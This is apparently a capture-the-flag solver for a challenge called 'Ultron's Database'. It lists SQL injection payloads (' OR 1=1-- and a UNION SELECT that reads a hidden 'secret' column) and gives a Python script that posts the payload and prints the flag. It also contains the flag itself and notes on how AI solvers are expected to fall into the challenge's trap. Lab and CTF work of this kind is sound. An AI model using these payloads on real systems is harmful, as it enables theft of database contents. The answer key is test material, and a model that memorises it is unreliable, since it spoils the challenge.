"""
C16 Solver — Ultron's Database

Basic SQLi on the codename field.
Query: SELECT codename, clearance FROM agents WHERE codename='INPUT'

Step 1: Confirm SQLi
  Input: ' OR 1=1--
  Result: shows rogers' clearance (first row) — confirms injection but no flag yet

Step 2: Enumerate columns
  The query returns 2 columns (codename, clearance)
  There's also a hidden 'secret' column AI doesn't know about

Step 3: UNION to extract secret column
  Input: ' UNION SELECT codename,secret FROM agents WHERE codename='ultron'--
  Result: Agent: ultron | Clearance: cyn0x{sql_1nj3ct10n_4ss3mbl3d}

AI trap: AI tries ' OR 1=1-- and gets rogers LEVEL_7, thinks it's done.
         Then tries UNION SELECT 1,2-- (wrong — needs actual column names)
         Doesn't know table is 'agents' with 'secret' column
"""
import requests

TARGET = "http://<host>:<port>"

payload = "' UNION SELECT codename,secret FROM agents WHERE codename='ultron'--"
r = requests.post(TARGET, data={'codename': payload})

import re
m = re.search(r'class="result">(.*?)</p>', r.text)
if m: print(m.group(1))
# Output: Agent: ultron | Clearance: cyn0x{sql_1nj3ct10n_4ss3mbl3d}